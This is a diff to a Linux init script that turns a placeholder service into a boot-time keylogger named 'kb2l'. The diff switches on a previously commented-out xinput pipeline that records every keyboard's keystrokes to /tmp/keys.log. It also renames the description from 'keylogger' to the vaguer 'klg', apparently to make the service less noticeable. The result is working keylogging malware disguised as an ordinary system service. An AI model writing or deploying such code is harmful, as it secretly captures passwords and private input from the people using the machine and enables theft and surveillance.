@@ -1,6 +1,6 @@
 #!/bin/sh
 ### BEGIN INIT INFO
-# Provides:          myservice
+# Provides:          kb2l
 # Required-Start:    $remote_fs $syslog
 # Required-Stop:     $remote_fs $syslog
 # Default-Start:     2 3 4 5
@@ -9,20 +9,17 @@
 # Description:       Enable service provided by daemon.
 ### END INIT INFO
 
-DESC="keylogger created by kb2l"
-NAME=myservice
+DESC="klg created by kb2l"
+NAME=kb2l
 #DAEMON=
 
 do_start()
 {
-   #xinput list |   grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' |   xargs -P0 -n1 xinput test > /tmp/keys.log &
-   echo "hello" >> /tmp/keys.log;
-   echo "starting!";
+   xinput list |   grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' |   xargs -P0 -n1 xinput test > /tmp/keys.log
 }
 
 do_stop()
 {
-   echo "stopping!"
 }
 
 case "$1" in
